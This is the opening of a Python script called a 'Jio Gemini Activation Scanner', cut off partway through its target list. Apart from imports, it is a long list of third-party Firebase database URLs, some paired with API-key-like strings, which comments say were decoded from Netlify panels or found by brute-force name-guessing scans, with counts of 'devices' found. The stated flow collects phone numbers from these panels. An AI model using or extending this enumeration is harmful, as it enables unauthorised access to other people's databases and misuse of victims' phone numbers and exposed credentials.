"""
Jio Gemini Activation Scanner - COMPLETE EDITION
All panels decoded from Netlify URLs
Flow: All Panels → Online Devices → Unique Numbers → Process Links
"""

from __future__ import annotations
import csv
import html
import json
import os
import re
import socket
import subprocess
import time
import base64
from collections import Counter, defaultdict
from datetime import datetime
import sys
import threading
import concurrent.futures
from pathlib import Path
from typing import Any
from urllib.parse import unquote
from zoneinfo import ZoneInfo

import requests
try:
    import websocket as _websocket_lib
    _WEBSOCKET_OK = True
except ImportError:
    _WEBSOCKET_OK = False

sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.stderr.reconfigure(encoding="utf-8", errors="replace")

# ==================== ALL PANELS (DECODED FROM NETLIFY URLS) ====================
# These were extracted from the Netlify panel URLs you provided
# Format: (firebase_url, auth_key)

FIREBASE_PANELS = [
    # From your original panels
    ("https://cep10hui-default-rtdb.firebaseio.com", "https://cep10hui-default-rtdb.firebaseio.com"),
    ("https://tinobiggan-default-rtdb.firebaseio.com", "https://tinobiggan-default-rtdb.firebaseio.com"),
    ("https://atifgndu-default-rtdb.firebaseio.com", "https://atifgndu-default-rtdb.firebaseio.com"),
    ("https://jsisbeuve-default-rtdb.firebaseio.com", "https://jsisbeuve-default-rtdb.firebaseio.com"),
    ("https://fir-27c9e-default-rtdb.firebaseio.com", "AizAsyA7EOpeZLDxPAYcS2_nb1J2ZKr4TNCgp6Q"),
    ("https://rupesh-6c5e5-default-rtdb.firebaseio.com", "AizAsyAFML11FrkfFMx0c4hOYqaCKUNVj5f8XhA"),
    ("https://desi-742d2-default-rtdb.firebaseio.com", "https://desi-742d2-default-rtdb.firebaseio.com"),
    ("https://santosh-8-default-rtdb.firebaseio.com", "https://santosh-8-default-rtdb.firebaseio.com"),
    ("https://yqhw2-fb47-default-rtdb.firebaseio.com", "AizAsyAdvY2CkMHoY3Ww_ah6b0pFdNKNTHKZnypUY"),
    ("https://ikka-83d65-default-rtdb.firebaseio.com", "https://ikka-83d65-default-rtdb.firebaseio.com"),
    ("https://master-panel-6bcfc-default-rtdb.firebaseio.com", "https://master-panel-6bcfc-default-rtdb.firebaseio.com"),
    ("https://landelle-20855-default-rtdb.firebaseio.com", "https://landelle-20855-default-rtdb.firebaseio.com"),
    ("https://autobot7-214ee-default-rtdb.firebaseio.com", "https://autobot7-214ee-default-rtdb.firebaseio.com"),
    ("https://shilpa-e712a-default-rtdb.firebaseio.com", "https://shilpa-e712a-default-rtdb.firebaseio.com"),
    ("https://dath-da88a-default-rtdb.firebaseio.com", "https://dath-da88a-default-rtdb.firebaseio.com"),
    ("https://apkdir-default-rtdb.firebaseio.com", "https://apkdir-default-rtdb.firebaseio.com"),
    ("https://apkpure-6eb6a-default-rtdb.firebaseio.com", "https://apkpure-6eb6a-default-rtdb.firebaseio.com"),
    ("https://hdjdjdj-a73f2-default-rtdb.firebaseio.com", "https://hdjdjdj-a73f2-default-rtdb.firebaseio.com"),
    ("https://yogeshbhaitumchuitya-default-rtdb.firebaseio.com", "https://yogeshbhaitumchuitya-default-rtdb.firebaseio.com"),
    ("https://anvith6-9450e-default-rtdb.firebaseio.com", "https://anvith6-9450e-default-rtdb.firebaseio.com"),
    ("https://jayma-9ce22-default-rtdb.firebaseio.com", "https://jayma-9ce22-default-rtdb.firebaseio.com"),
    ("https://konaio-default-rtdb.firebaseio.com", "https://konaio-default-rtdb.firebaseio.com"),
    ("https://kitter-34345-default-rtdb.firebaseio.com", "https://kitter-34345-default-rtdb.firebaseio.com"),
    ("https://apkdir-f6fb9-default-rtdb.firebaseio.com", "https://apkdir-f6fb9-default-rtdb.firebaseio.com"),
    ("https://vibe-d238e-default-rtdb.firebaseio.com", "https://vibe-d238e-default-rtdb.firebaseio.com"),
    ("https://alienware-c11b0-default-rtdb.firebaseio.com", "https://alienware-c11b0-default-rtdb.firebaseio.com"),
    ("https://csforme-dc64a-default-rtdb.firebaseio.com", "AizAsyCEk7GmmKKwJSCAjCDIxOa8AISQZyxy6bw"),
    ("https://max-a-cbe29-default-rtdb.firebaseio.com", "AizAsyCQeygjNYLwmbf_ZC86gvRye7XBI-BIBawq"),
    
    # ===== DECODED FROM NETLIFY URLS =====
    ("https://raaz-5287d-default-rtdb.firebaseio.com", "Hebdixnd"),
    ("https://singhaan-6f199-default-rtdb.firebaseio.com", "AizAsyD-1Gvt2cmr0mv1x0K4V9vtjVMXyJVLAv"),
    ("https://painislv-default-rtdb.firebaseio.com", "AizAsyCqnjDPgVCaE36q7N4HbdfUEB9FbluM8pDs"),
    ("https://risho-d4c66-default-rtdb.firebaseio.com", "AizAsyBkccFcNJ-FfClxHMzrRAyropULYvexsW0"),
    ("https://runjun-master-panel-default-rtdb.firebaseio.com", "AizAsyBawSxrOxhTZk7C2V0-LkcoyEs7n6y4msw"),
    ("https://tinmn88-b7db5-default-rtdb.firebaseio.com", "AizAsyBDanswTNTm4-E7v4wCX-_WsQ0A8ZaDIf"),
    ("https://e14turnament2-default-rtdb.firebaseio.com", "AizAsyBIJawvyJ8SHeZ14iLesyx4bAOr8EPGt"),
    ("https://newspreding-default-rtdb.firebaseio.com", "AizAsyDsWt99EDO-HdTmG3U9tARSElpki13JWFo"),
    ("https://bossbun-default-rtdb.firebaseio.com", "AizAsyBfqObM5HnK6khogyF4ytOX7E9N0e_lAQ"),
    ("https://jpicku-47790-default-rtdb.firebaseio.com", "https://jpicku-47790-default-rtdb.firebaseio.com"),
    ("https://shivalmpanel-eb3b7-default-rtdb.firebaseio.com", "https://shivalmpanel-eb3b7-default-rtdb.firebaseio.com"),
    ("https://annu-f0207-default-rtdb.firebaseio.com", "https://annu-f0207-default-rtdb.firebaseio.com"),
    ("https://strange-2e4aa-default-rtdb.firebaseio.com", "https://strange-2e4aa-default-rtdb.firebaseio.com"),
    ("https://customer-support-5-default-rtdb.firebaseio.com", "https://customer-support-5-default-rtdb.firebaseio.com"),
    ("https://gandhi-ji-1-default-rtdb.asia-southeast1.firebaseio.com", "https://gandhi-ji-1-default-rtdb.asia-southeast1.firebaseio.com"),
    ("https://muajob-29c86-default-rtdb.firebaseio.com", "https://muajob-29c86-default-rtdb.firebaseio.com"),
    ("https://totala-panel-default-rtdb.firebaseio.com", "https://totala-panel-default-rtdb.firebaseio.com"),
    ("https://kingu-2dbb9-default-rtdb.firebaseio.com", "https://kingu-2dbb9-default-rtdb.firebaseio.com"),
    ("https://rajabhaya-default-rtdb.firebaseio.com", "https://rajabhaya-default-rtdb.firebaseio.com"),
    ("https://heisenberg-8c3da-default-rtdb.firebaseio.com", "https://heisenberg-8c3da-default-rtdb.firebaseio.com"),
    ("https://customer-support-12e40-default-rtdb.firebaseio.com", "https://customer-support-12e40-default-rtdb.firebaseio.com"),
    ("https://sada-bcbcd-default-rtdb.firebaseio.com", "https://sada-bcbcd-default-rtdb.firebaseio.com"),
    ("https://bharat56-b6ee1-default-rtdb.firebaseio.com", "https://bharat56-b6ee1-default-rtdb.firebaseio.com"),
    ("https://phone55-d7d89-default-rtdb.firebaseio.com", "https://phone55-d7d89-default-rtdb.firebaseio.com"),
    ("https://e9turnament1-default-rtdb.firebaseio.com", "https://e9turnament1-default-rtdb.firebaseio.com"),
    ("https://colana-84ce2-default-rtdb.firebaseio.com", "https://colana-84ce2-default-rtdb.firebaseio.com"),
    ("https://hospital-14-default-rtdb.firebaseio.com", "https://hospital-14-default-rtdb.firebaseio.com"),
    
    # ===== MORE DECODED PANELS =====
    ("https://vdgsh-623ed-default-rtdb.firebaseio.com", "https://vdgsh-623ed-default-rtdb.firebaseio.com"),
    ("https://arvind-c5b03-default-rtdb.firebaseio.com", "https://arvind-c5b03-default-rtdb.firebaseio.com"),
    ("https://axisjames-default-rtdb.firebaseio.com", "https://axisjames-default-rtdb.firebaseio.com"),
    ("https://mafiaaaa2oppp-default-rtdb.firebaseio.com", "AizAsyBl3179G60c2LzYPrbkp4tmuRKK_7H0_0g"),
    ("https://niggasionic-default-rtdb.asia-southeast1.firebasedatabase.app", "https://niggasionic-default-rtdb.asia-southeast1.firebasedatabase.app"),
    ("https://krijhjuiiccyy-default-rtdb.firebaseio.com", "https://krijhjuiiccyy-default-rtdb.firebaseio.com"),
    ("https://youbabu-default-rtdb.firebaseio.com", "https://youbabu-default-rtdb.firebaseio.com"),
    ("https://kali-1b217-default-rtdb.firebaseio.com", "https://kali-1b217-default-rtdb.firebaseio.com"),
    ("https://sallu-9934f-default-rtdb.firebaseio.com", "https://sallu-9934f-default-rtdb.firebaseio.com"),
    ("https://chinky-d92ab-default-rtdb.firebaseio.com", "https://chinky-d92ab-default-rtdb.firebaseio.com"),
    ("https://loddysingh-6d511-default-rtdb.firebaseio.com", "https://loddysingh-6d511-default-rtdb.firebaseio.com"),
    ("https://simadevi-f42fc-default-rtdb.firebaseio.com", "https://simadevi-f42fc-default-rtdb.firebaseio.com"),
    ("https://olamigo-41620-default-rtdb.firebaseio.com", "https://olamigo-41620-default-rtdb.firebaseio.com"),
    ("https://anup-f900e-default-rtdb.firebaseio.com", "https://anup-f900e-default-rtdb.firebaseio.com"),
    ("https://bishnu-a0e01-default-rtdb.firebaseio.com", "https://bishnu-a0e01-default-rtdb.firebaseio.com"),
    ("https://akmbro-be675-default-rtdb.asia-southeast1.firebasedatabase.app", "https://akmbro-be675-default-rtdb.asia-southeast1.firebasedatabase.app"),
    ("https://hdhdusgsvshshshs-default-rtdb.firebaseio.com", "https://hdhdusgsvshshshs-default-rtdb.firebaseio.com"),
    ("https://sastaapp-394cd-default-rtdb.firebaseio.com", "https://sastaapp-394cd-default-rtdb.firebaseio.com"),

    # ===== NEWLY FOUND PANELS (auto-scan 2026-10-15) =====
    ("https://santosh-new-default-rtdb.firebaseio.com", "https://santosh-new-default-rtdb.firebaseio.com"),      # 13 devices
    ("https://rohan-3-default-rtdb.firebaseio.com", "https://rohan-3-default-rtdb.firebaseio.com"),              # 76 devices
    ("https://bihar-panel-default-rtdb.firebaseio.com", "https://bihar-panel-default-rtdb.firebaseio.com"),      # 16 devices
    ("https://chandan-new-default-rtdb.firebaseio.com", "https://chandan-new-default-rtdb.firebaseio.com"),      # 13 devices
    ("https://madan-panel-default-rtdb.firebaseio.com", "https://madan-panel-default-rtdb.firebaseio.com"),      # 13 devices
    ("https://rahul-panel-default-rtdb.firebaseio.com", "https://rahul-panel-default-rtdb.firebaseio.com"),      # 6 devices
    ("https://ankit-4-default-rtdb.firebaseio.com", "https://ankit-4-default-rtdb.firebaseio.com"),              # 1 device
    ("https://rajesh-panel-default-rtdb.firebaseio.com", "https://rajesh-panel-default-rtdb.firebaseio.com"),
    ("https://anil-panel-default-rtdb.firebaseio.com", "https://anil-panel-default-rtdb.firebaseio.com"),
    ("https://gupta-2-default-rtdb.firebaseio.com", "https://gupta-2-default-rtdb.firebaseio.com"),
    ("https://babu-panel-default-rtdb.firebaseio.com", "https://babu-panel-default-rtdb.firebaseio.com"),
    ("https://raj-panel-default-rtdb.firebaseio.com", "https://raj-panel-default-rtdb.firebaseio.com"),

    # ===== BATCH 2 - ADDITIONAL JIO PANELS =====
    ("https://rohit-panel-default-rtdb.firebaseio.com", "https://rohit-panel-default-rtdb.firebaseio.com"),
    ("https://rahul-3-default-rtdb.firebaseio.com", "https://rahul-3-default-rtdb.firebaseio.com"),
    ("https://rahul-new-default-rtdb.firebaseio.com", "https://rahul-new-default-rtdb.firebaseio.com"),
    ("https://amit-panel-default-rtdb.firebaseio.com", "https://amit-panel-default-rtdb.firebaseio.com"),
    ("https://amit-new-default-rtdb.firebaseio.com", "https://amit-new-default-rtdb.firebaseio.com"),
    ("https://amit-2-default-rtdb.firebaseio.com", "https://amit-2-default-rtdb.firebaseio.com"),
    ("https://amit-3-default-rtdb.firebaseio.com", "https://amit-3-default-rtdb.firebaseio.com"),
    ("https://vikash-panel-default-rtdb.firebaseio.com", "https://vikash-panel-default-rtdb.firebaseio.com"),
    ("https://vikash-new-default-rtdb.firebaseio.com", "https://vikash-new-default-rtdb.firebaseio.com"),
    ("https://deepak-panel-default-rtdb.firebaseio.com", "https://deepak-panel-default-rtdb.firebaseio.com"),
    ("https://deepak-new-default-rtdb.firebaseio.com", "https://deepak-new-default-rtdb.firebaseio.com"),
    ("https://deepak-2-default-rtdb.firebaseio.com", "https://deepak-2-default-rtdb.firebaseio.com"),
    ("https://sanjay-panel-default-rtdb.firebaseio.com", "https://sanjay-panel-default-rtdb.firebaseio.com"),
    ("https://sanjay-new-default-rtdb.firebaseio.com", "https://sanjay-new-default-rtdb.firebaseio.com"),
    ("https://suresh-panel-default-rtdb.firebaseio.com", "https://suresh-panel-default-rtdb.firebaseio.com"),
    ("https://suresh-new-default-rtdb.firebaseio.com", "https://suresh-new-default-rtdb.firebaseio.com"),
    ("https://ramesh-panel-default-rtdb.firebaseio.com", "https://ramesh-panel-default-rtdb.firebaseio.com"),
    ("https://ramesh-new-default-rtdb.firebaseio.com", "https://ramesh-new-default-rtdb.firebaseio.com"),
    ("https://rajesh-new-default-rtdb.firebaseio.com", "https://rajesh-new-default-rtdb.firebaseio.com"),
    ("https://rajesh-2-default-rtdb.firebaseio.com", "https://rajesh-2-default-rtdb.firebaseio.com"),
    ("https://rohit-new-default-rtdb.firebaseio.com", "https://rohit-new-default-rtdb.firebaseio.com"),
    ("https://rohit-2-default-rtdb.firebaseio.com", "https://rohit-2-default-rtdb.firebaseio.com"),
    ("https://rohit-3-default-rtdb.firebaseio.com", "https://rohit-3-default-rtdb.firebaseio.com"),
    ("https://ravi-panel-default-rtdb.firebaseio.com", "https://ravi-panel-default-rtdb.firebaseio.com"),
    ("https://ravi-new-default-rtdb.firebaseio.com", "https://ravi-new-default-rtdb.firebaseio.com"),
    ("https://ravi-2-default-rtdb.firebaseio.com", "https://ravi-2-default-rtdb.firebaseio.com"),
    ("https://lucky-panel-default-rtdb.firebaseio.com", "https://lucky-panel-default-rtdb.firebaseio.com"),
    ("https://lucky-new-default-rtdb.firebaseio.com", "https://lucky-new-default-rtdb.firebaseio.com"),
    ("https://lucky-2-default-rtdb.firebaseio.com", "https://lucky-2-default-rtdb.firebaseio.com"),
    ("https://prince-panel-default-rtdb.firebaseio.com", "https://prince-panel-default-rtdb.firebaseio.com"),
    ("https://prince-new-default-rtdb.firebaseio.com", "https://prince-new-default-rtdb.firebaseio.com"),
    ("https://sunny-panel-default-rtdb.firebaseio.com", "https://sunny-panel-default-rtdb.firebaseio.com"),
    ("https://sunny-new-default-rtdb.firebaseio.com", "https://sunny-new-default-rtdb.firebaseio.com"),
    ("https://sunny-2-default-rtdb.firebaseio.com", "https://sunny-2-default-rtdb.firebaseio.com"),
    ("https://rohan-panel-default-rtdb.firebaseio.com", "https://rohan-panel-default-rtdb.firebaseio.com"),
    ("https://rohan-new-default-rtdb.firebaseio.com", "https://rohan-new-default-rtdb.firebaseio.com"),
    ("https://rohan-2-default-rtdb.firebaseio.com", "https://rohan-2-default-rtdb.firebaseio.com"),
    ("https://rohan-4-default-rtdb.firebaseio.com", "https://rohan-4-default-rtdb.firebaseio.com"),
    ("https://sachin-panel-default-rtdb.firebaseio.com", "https://sachin-panel-default-rtdb.firebaseio.com"),
    ("https://sachin-new-default-rtdb.firebaseio.com", "https://sachin-new-default-rtdb.firebaseio.com"),
    ("https://sachin-2-default-rtdb.firebaseio.com", "https://sachin-2-default-rtdb.firebaseio.com"),
    ("https://vishal-panel-default-rtdb.firebaseio.com", "https://vishal-panel-default-rtdb.firebaseio.com"),
    ("https://vishal-new-default-rtdb.firebaseio.com", "https://vishal-new-default-rtdb.firebaseio.com"),
    ("https://vishal-2-default-rtdb.firebaseio.com", "https://vishal-2-default-rtdb.firebaseio.com"),
    ("https://ankit-panel-default-rtdb.firebaseio.com", "https://ankit-panel-default-rtdb.firebaseio.com"),
    ("https://ankit-new-default-rtdb.firebaseio.com", "https://ankit-new-default-rtdb.firebaseio.com"),
    ("https://ankit-2-default-rtdb.firebaseio.com", "https://ankit-2-default-rtdb.firebaseio.com"),
    ("https://ankit-3-default-rtdb.firebaseio.com", "https://ankit-3-default-rtdb.firebaseio.com"),
    ("https://mohit-panel-default-rtdb.firebaseio.com", "https://mohit-panel-default-rtdb.firebaseio.com"),
    ("https://mohit-new-default-rtdb.firebaseio.com", "https://mohit-new-default-rtdb.firebaseio.com"),
    ("https://mohit-2-default-rtdb.firebaseio.com", "https://mohit-2-default-rtdb.firebaseio.com"),
    ("https://rinku-panel-default-rtdb.firebaseio.com", "https://rinku-panel-default-rtdb.firebaseio.com"),
    ("https://rinku-new-default-rtdb.firebaseio.com", "https://rinku-new-default-rtdb.firebaseio.com"),
    ("https://bunty-panel-default-rtdb.firebaseio.com", "https://bunty-panel-default-rtdb.firebaseio.com"),
    ("https://raju-panel-default-rtdb.firebaseio.com", "https://raju-panel-default-rtdb.firebaseio.com"),
    ("https://raju-new-default-rtdb.firebaseio.com", "https://raju-new-default-rtdb.firebaseio.com"),
    ("https://raju-2-default-rtdb.firebaseio.com", "https://raju-2-default-rtdb.firebaseio.com"),
    ("https://shyam-panel-default-rtdb.firebaseio.com", "https://shyam-panel-default-rtdb.firebaseio.com"),
    ("https://gopal-panel-default-rtdb.firebaseio.com", "https://gopal-panel-default-rtdb.firebaseio.com"),
    ("https://mohan-panel-default-rtdb.firebaseio.com", "https://mohan-panel-default-rtdb.firebaseio.com"),
    ("https://chandan-panel-default-rtdb.firebaseio.com", "https://chandan-panel-default-rtdb.firebaseio.com"),
    ("https://chandan-2-default-rtdb.firebaseio.com", "https://chandan-2-default-rtdb.firebaseio.com"),
    ("https://madan-new-default-rtdb.firebaseio.com", "https://madan-new-default-rtdb.firebaseio.com"),
    ("https://madan-2-default-rtdb.firebaseio.com", "https://madan-2-default-rtdb.firebaseio.com"),
    ("https://sharma-panel-default-rtdb.firebaseio.com", "https://sharma-panel-default-rtdb.firebaseio.com"),
    ("https://sharma-new-default-rtdb.firebaseio.com", "https://sharma-new-default-rtdb.firebaseio.com"),
    ("https://sharma-2-default-rtdb.firebaseio.com", "https://sharma-2-default-rtdb.firebaseio.com"),
    ("https://verma-panel-default-rtdb.firebaseio.com", "https://verma-panel-default-rtdb.firebaseio.com"),
    ("https://verma-new-default-rtdb.firebaseio.com", "https://verma-new-default-rtdb.firebaseio.com"),
    ("https://singh-panel-default-rtdb.firebaseio.com", "https://singh-panel-default-rtdb.firebaseio.com"),
    ("https://singh-new-default-rtdb.firebaseio.com", "https://singh-new-default-rtdb.firebaseio.com"),
    ("https://singh-2-default-rtdb.firebaseio.com", "https://singh-2-default-rtdb.firebaseio.com"),
    ("https://yadav-panel-default-rtdb.firebaseio.com", "https://yadav-panel-default-rtdb.firebaseio.com"),
    ("https://yadav-new-default-rtdb.firebaseio.com", "https://yadav-new-default-rtdb.firebaseio.com"),
    ("https://kumar-panel-default-rtdb.firebaseio.com", "https://kumar-panel-default-rtdb.firebaseio.com"),
    ("https://kumar-new-default-rtdb.firebaseio.com", "https://kumar-new-default-rtdb.firebaseio.com"),
    ("https://kumar-2-default-rtdb.firebaseio.com", "https://kumar-2-default-rtdb.firebaseio.com"),
    ("https://kumar-3-default-rtdb.firebaseio.com", "https://kumar-3-default-rtdb.firebaseio.com"),
    ("https://reddy-panel-default-rtdb.firebaseio.com", "https://reddy-panel-default-rtdb.firebaseio.com"),
    ("https://nair-panel-default-rtdb.firebaseio.com", "https://nair-panel-default-rtdb.firebaseio.com"),
    ("https://patil-panel-default-rtdb.firebaseio.com", "https://patil-panel-default-rtdb.firebaseio.com"),
    ("https://jio-panel-1-default-rtdb.firebaseio.com", "https://jio-panel-1-default-rtdb.firebaseio.com"),
    ("https://jio-panel-2-default-rtdb.firebaseio.com", "https://jio-panel-2-default-rtdb.firebaseio.com"),
    ("https://jio-panel-3-default-rtdb.firebaseio.com", "https://jio-panel-3-default-rtdb.firebaseio.com"),
    ("https://jio-panel-4-default-rtdb.firebaseio.com", "https://jio-panel-4-default-rtdb.firebaseio.com"),
    ("https://jio-panel-5-default-rtdb.firebaseio.com", "https://jio-panel-5-default-rtdb.firebaseio.com"),
    ("https://jio-master-1-default-rtdb.firebaseio.com", "https://jio-master-1-default-rtdb.firebaseio.com"),
    ("https://jio-master-2-default-rtdb.firebaseio.com", "https://jio-master-2-default-rtdb.firebaseio.com"),
    ("https://jio-bot-1-default-rtdb.firebaseio.com", "https://jio-bot-1-default-rtdb.firebaseio.com"),
    ("https://jio-bot-2-default-rtdb.firebaseio.com", "https://jio-bot-2-default-rtdb.firebaseio.com"),
    ("https://jio-otp-1-default-rtdb.firebaseio.com", "https://jio-otp-1-default-rtdb.firebaseio.com"),
    ("https://jio-otp-2-default-rtdb.firebaseio.com", "https://jio-otp-2-default-rtdb.firebaseio.com"),
    ("https://india-panel-1-default-rtdb.firebaseio.com", "https://india-panel-1-default-rtdb.firebaseio.com"),
    ("https://india-panel-2-default-rtdb.firebaseio.com", "https://india-panel-2-default-rtdb.firebaseio.com"),
    ("https://up-panel-default-rtdb.firebaseio.com", "https://up-panel-default-rtdb.firebaseio.com"),
    ("https://up-new-default-rtdb.firebaseio.com", "https://up-new-default-rtdb.firebaseio.com"),
    ("https://delhi-panel-default-rtdb.firebaseio.com", "https://delhi-panel-default-rtdb.firebaseio.com"),
    ("https://delhi-new-default-rtdb.firebaseio.com", "https://delhi-new-default-rtdb.firebaseio.com"),
    ("https://mumbai-panel-default-rtdb.firebaseio.com", "https://mumbai-panel-default-rtdb.firebaseio.com"),
    ("https://rajasthan-panel-default-rtdb.firebaseio.com", "https://rajasthan-panel-default-rtdb.firebaseio.com"),
    ("https://mp-panel-default-rtdb.firebaseio.com", "https://mp-panel-default-rtdb.firebaseio.com"),
    ("https://haryana-panel-default-rtdb.firebaseio.com", "https://haryana-panel-default-rtdb.firebaseio.com"),
    ("https://punjab-panel-default-rtdb.firebaseio.com", "https://punjab-panel-default-rtdb.firebaseio.com"),

    # ===== BATCH 3 - FOUND via number-pattern scan =====
    ("https://rupesh-123-default-rtdb.firebaseio.com", "https://rupesh-123-default-rtdb.firebaseio.com"),   # 32 devices
    ("https://raja-c-default-rtdb.firebaseio.com", "https://raja-c-default-rtdb.firebaseio.com"),           # 33 devices
    ("https://amit-56-default-rtdb.firebaseio.com", "https://amit-56-default-rtdb.firebaseio.com"),         # 2 devices

    # ===== BATCH 4 - letter-suffix scan =====
    ("https://sanjay-y-default-rtdb.firebaseio.com", "https://sanjay-y-default-rtdb.firebaseio.com"),      # 86 devices !!
    ("https://deepak-yh-default-rtdb.firebaseio.com", "https://deepak-yh-default-rtdb.firebaseio.com"),    # 34 devices
    ("https://sanjay-kf-default-rtdb.firebaseio.com", "https://sanjay-kf-default-rtdb.firebaseio.com"),    # 26 devices
    ("https://sanjay-da-default-rtdb.firebaseio.com", "https://sanjay-da-default-rtdb.firebaseio.com"),    # 13 devices
    ("https://rajesh-yg-default-rtdb.firebaseio.com", "https://rajesh-yg-default-rtdb.firebaseio.com"),    # 5 devices
    ("https://rohan-ku-default-rtdb.firebaseio.com", "https://rohan-ku-default-rtdb.firebaseio.com"),      # 3 devices
    ("https://santosh-ka-default-rtdb.firebaseio.com", "https://santosh-ka-default-rtdb.firebaseio.com"),  # 2 devices

    # ===== BATCH 5 - expanded Indian name variants =====
    # sanjay variants
    ("https://sanjay-z-default-rtdb.firebaseio.com", "https://sanjay-z-default-rtdb.firebaseio.com"),
    ("https://sanjay-m-default-rtdb.firebaseio.com", "https://sanjay-m-default-rtdb.firebaseio.com"),
    ("https://sanjay-k-default-rtdb.firebaseio.com", "https://sanjay-k-default-rtdb.firebaseio.com"),
    ("https://sanjay-r-default-rtdb.firebaseio.com", "https://sanjay-r-default-rtdb.firebaseio.com"),
    ("https://sanjay-b-default-rtdb.firebaseio.com", "https://sanjay-b-default-rtdb.firebaseio.com"),
    ("https://sanjay-2-default-rtdb.firebaseio.com", "https://sanjay-2-default-rtdb.firebaseio.com"),
    ("https://sanjay-3-default-rtdb.firebaseio.com", "https://sanjay-3-default-rtdb.firebaseio.com"),
    ("https://sanjay-4-default-rtdb.firebaseio.com", "https://sanjay-4-default-rtdb.firebaseio.com"),
    ("https://sanjay-5-default-rtdb.firebaseio.com", "https://sanjay-5-default-rtdb.firebaseio.com"),
    ("https://sanjay-vip-default-rtdb.firebaseio.com", "https://sanjay-vip-default-rtdb.firebaseio.com"),
    ("https://sanjay-pro-default-rtdb.firebaseio.com", "https://sanjay-pro-default-rtdb.firebaseio.com"),
    # deepak variants
    ("https://deepak-z-default-rtdb.firebaseio.com", "https://deepak-z-default-rtdb.firebaseio.com"),
    ("https://deepak-k-default-rtdb.firebaseio.com", "https://deepak-k-default-rtdb.firebaseio.com"),
    ("https://deepak-r-default-rtdb.firebaseio.com", "https://deepak-r-default-rtdb.firebaseio.com"),
    ("https://deepak-3-default-rtdb.firebaseio.com", "https://deepak-3-default-rtdb.firebaseio.com"),
    ("https://deepak-4-default-rtdb.firebaseio.com", "https://deepak-4-default-rtdb.firebaseio.com"),
    ("https://deepak-5-default-rtdb.firebaseio.com", "https://deepak-5-default-rtdb.firebaseio.com"),
    ("https://deepak-vip-default-rtdb.firebaseio.com", "https://deepak-vip-default-rtdb.firebaseio.com"),
    # rajesh variants
    ("https://rajesh-z-default-rtdb.firebaseio.com", "https://rajesh-z-default-rtdb.firebaseio.com"),
    ("https://rajesh-k-default-rtdb.firebaseio.com", "https://rajesh-k-default-rtdb.firebaseio.com"),
    ("https://rajesh-3-default-rtdb.firebaseio.com", "https://rajesh-3-default-rtdb.firebaseio.com"),
    ("https://rajesh-4-default-rtdb.firebaseio.com", "https://rajesh-4-default-rtdb.firebaseio.com"),
    ("https://rajesh-5-default-rtdb.firebaseio.com", "https://rajesh-5-default-rtdb.firebaseio.com"),
    # rohan variants
    ("https://rohan-5-default-rtdb.firebaseio.com", "https://rohan-5-default-rtdb.firebaseio.com"),
    ("https://rohan-6-default-rtdb.firebaseio.com", "https://rohan-6-default-rtdb.firebaseio.com"),
    ("https://rohan-7-default-rtdb.firebaseio.com", "https://rohan-7-default-rtdb.firebaseio.com"),
    ("https://rohan-vip-default-rtdb.firebaseio.com", "https://rohan-vip-default-rtdb.firebaseio.com"),
    # santosh variants
    ("https://santosh-2-default-rtdb.firebaseio.com", "https://santosh-2-default-rtdb.firebaseio.com"),
    ("https://santosh-3-default-rtdb.firebaseio.com", "https://santosh-3-default-rtdb.firebaseio.com"),
    ("https://santosh-4-default-rtdb.firebaseio.com", "https://santosh-4-default-rtdb.firebaseio.com"),
    ("https://santosh-vip-default-rtdb.firebaseio.com", "https://santosh-vip-default-rtdb.firebaseio.com"),
    ("https://santosh-bhai-default-rtdb.firebaseio.com", "https://santosh-bhai-default-rtdb.firebaseio.com"),
    # rahul variants
    ("https://rahul-2-default-rtdb.firebaseio.com", "https://rahul-2-default-rtdb.firebaseio.com"),
    ("https://rahul-4-default-rtdb.firebaseio.com", "https://rahul-4-default-rtdb.firebaseio.com"),
    ("https://rahul-5-default-rtdb.firebaseio.com", "https://rahul-5-default-rtdb.firebaseio.com"),
    ("https://rahul-vip-default-rtdb.firebaseio.com", "https://rahul-vip-default-rtdb.firebaseio.com"),
    # rupesh variants
    ("https://rupesh-new-default-rtdb.firebaseio.com", "https://rupesh-new-default-rtdb.firebaseio.com"),
    ("https://rupesh-2-default-rtdb.firebaseio.com", "https://rupesh-2-default-rtdb.firebaseio.com"),
    ("https://rupesh-3-default-rtdb.firebaseio.com", "https://rupesh-3-default-rtdb.firebaseio.com"),
    ("https://rupesh-panel-default-rtdb.firebaseio.com", "https://rupesh-panel-default-rtdb.firebaseio.com"),
    ("https://rupesh-vip-default-rtdb.firebaseio.com", "https://rupesh-vip-default-rtdb.firebaseio.com"),
    # raja variants
    ("https://raja-a-default-rtdb.firebaseio.com", "https://raja-a-default-rtdb.firebaseio.com"),
    ("https://raja-b-default-rtdb.firebaseio.com", "https://raja-b-default-rtdb.firebaseio.com"),
    ("https://raja-d-default-rtdb.firebaseio.com", "https://raja-d-default-rtdb.firebaseio.com"),
    ("https://raja-e-default-rtdb.firebaseio.com", "https://raja-e-default-rtdb.firebaseio.com"),
    ("https://raja-2-default-rtdb.firebaseio.com", "https://raja-2-default-rtdb.firebaseio.com"),
    ("https://raja-3-default-rtdb.firebaseio.com", "https://raja-3-default-rtdb.firebaseio.com"),
    ("https://raja-new-default-rtdb.firebaseio.com", "https://raja-new-default-rtdb.firebaseio.com"),
    ("https://raja-panel-default-rtdb.firebaseio.com", "https://raja-panel-default-rtdb.firebaseio.com"),
    # new base names not tried before
    ("https://pappu-panel-default-rtdb.firebaseio.com", "https://pappu-panel-default-rtdb.firebaseio.com"),
    ("https://pappu-new-default-rtdb.firebaseio.com", "https://pappu-new-default-rtdb.firebaseio.com"),
    ("https://pappu-2-default-rtdb.firebaseio.com", "https://pappu-2-default-rtdb.firebaseio.com"),
    ("https://bittu-panel-default-rtdb.firebaseio.com", "https://bittu-panel-default-rtdb.firebaseio.com"),
    ("https://bittu-new-default-rtdb.firebaseio.com", "https://bittu-new-default-rtdb.firebaseio.com"),
    ("https://pintu-panel-default-rtdb.firebaseio.com", "https://pintu-panel-default-rtdb.firebaseio.com"),
    ("https://rinku-2-default-rtdb.firebaseio.com", "https://rinku-2-default-rtdb.firebaseio.com"),
    ("https://sonu-panel-default-rtdb.firebaseio.com", "https://sonu-panel-default-rtdb.firebaseio.com"),
    ("https://sonu-new-default-rtdb.firebaseio.com", "https://sonu-new-default-rtdb.firebaseio.com"),
    ("https://sonu-2-default-rtdb.firebaseio.com", "https://sonu-2-default-rtdb.firebaseio.com"),
    ("https://monu-panel-default-rtdb.firebaseio.com", "https://monu-panel-default-rtdb.firebaseio.com"),
